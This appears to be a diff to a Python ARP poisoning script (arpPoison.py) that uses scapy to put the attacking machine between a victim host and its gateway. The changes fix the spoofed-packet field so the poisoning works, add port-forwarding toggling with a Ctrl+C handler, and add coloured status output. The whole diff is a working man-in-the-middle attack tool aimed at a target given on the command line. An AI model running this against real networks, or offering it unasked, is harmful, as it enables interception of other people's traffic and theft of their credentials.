@@ -22,6 +22,17 @@ import subprocess
 from subprocess import Popen, PIPE
 import scapy.all as scap
 from getmac import get_mac_address
+from signal import signal, SIGINT
+from termcolor import colored
+
+
+def exitHandler(signal, frame):
+	'''
+	SIGINT handler for ending program
+	'''
+	togglePortForwarding(0)	
+	exit(0)
+
 
 def extractIP(line):
 	'''
@@ -58,17 +69,31 @@ def getDefaultGateway(output):
 		currLine = output.stdout.readline().decode('utf-8')
 
 
-def enablePortForwarding():
+def togglePortForwarding(t):
 	'''
-	Enables port forwarding on the local, attacking machine
+	Enables/disables port forwarding on the local, attacking machine
+
+	Keyword arguments:
+	t - toggle set for enable, clear for disable
 	'''
-	subprocess.call(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
+	assert(t == 0 or t == 1)
+
+	if t == 1:
+		stmt = colored('[*] Enabling port forwarding', 'green')
+	elif t == 0:
+		stmt = colored('[*] Disabling port forwarding', 'red')
+
+	print(stmt)
+	cmd = 'net.ipv4.ip_forward=' + str(t) 
+	subprocess.call(['sysctl', '-w', cmd])
 
 
 if __name__ == '__main__':
+	signal(SIGINT, exitHandler)		# Listening for ctrl + c
+
 	if len(sys.argv) < 2:
 		print('Usage: sudo python3 arpPoison.py <target_IP_address>')
-		print('[*] sudo privileges required for modification of port forwarding')
+		print('*** sudo privileges required for modification of port forwarding')
 		exit(-1)
 	else:
 		victim_ip = sys.argv[1]
@@ -82,15 +107,24 @@ if __name__ == '__main__':
 
 		attacker_mac = get_mac_address()	
 
-		enablePortForwarding()	
+		togglePortForwarding(1)	
+	
 		
-		print('[*] Beginning ARP poison')
+		print(colored('[*] Beginning ARP poison, Ctrl+c to quit', 'yellow'))
+		print(' -- GATEWAY: ', gateway_ip)
+		print(' -- VICTIM: ', victim_ip)
 		while True:
 			# Telling the victim 'I am the router'
-			vic_packet = scap.ARP(op=1, pdst=victim_ip, hwaddr=attacker_mac, psrc=gateway_ip)
+			vic_packet = scap.ARP(op=1, pdst=victim_ip, hwsrc=attacker_mac, psrc=gateway_ip)
 			scap.send(vic_packet)
 
 			# Telling the router 'I am the victim'
-			router_packet = scap.ARP(op=1, pdst=gateway_ip, hwaddr=attacker_mac, psrc=victim_ip)
+			router_packet = scap.ARP(op=1, pdst=gateway_ip, hwsrc=attacker_mac, psrc=victim_ip)
 			scap.send(router_packet)
-			print('Poisoning router: ', gateway_ip, ' with victim: ', victim_ip)
+			'''			
+			if i % 25 == 0:
+				print('[+] Poisoning active')
+				print(' |')
+				print(' |--> Gateway: ', gateway_ip)
+				print(' |--> Victim: ', victim_ip)
+			'''
